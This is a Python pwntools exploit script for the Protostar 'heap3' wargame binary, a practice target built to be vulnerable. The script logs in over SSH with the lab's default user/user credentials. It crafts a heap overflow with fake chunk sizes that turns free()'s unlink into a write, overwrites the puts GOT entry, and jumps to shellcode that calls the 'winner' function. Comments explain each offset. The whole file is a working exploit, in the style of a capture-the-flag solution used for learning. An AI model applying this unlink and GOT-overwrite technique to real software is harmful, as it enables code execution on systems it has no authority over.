#!/usr/bin/env python

from pwn import *

winner = 0x8048864              # (gdb) p winner
putsGOTEntry = 0x0804b11c       # disas puts call and - 12 as offset because of unlink()
scAddr = 0x804c014
def exploit(ipAddr):
    e = ELF('./heap3')
    s = ssh("user", ipAddr, 22, password="user")
    arg1 = "A"*12                               # 12 Bytes padding so our shellcode wont truncate
    arg1 += asm("mov eax, 0x8048864;call eax")  # shellcode calls winner
    arg2 = "A"*36 + "\x65"              # 32 is the block size so we have to overwrite next block size to 0x65 with offset 36       
                                        # 65 = int(101) and its tells that next block size is 100. 
                                        # with last bit used 1 as referring that block before is in use.
                                        # have to make bigger allocation than 80 so we use 100, because free uses unlink function
                                        # to control got when we use bigger allocation.
    arg3 = "C"*92 + p32(0xfffffffc) + p32(0xfffffffc)   # 0xfffffffc is -4 we must use -4 because we can't use nullbytes 
    arg3 += p32(putsGOTEntry) + p32(scAddr)

    r = s.run('/opt/protostar/bin/heap3 {}'.format(arg1+" "+arg2+" "+arg3))
    print(r.recv())
    r.close()

if len(sys.argv) < 2:
    print("usage: ./%s <ip>" % sys.argv[0])

else:
    exploit(sys.argv[1])
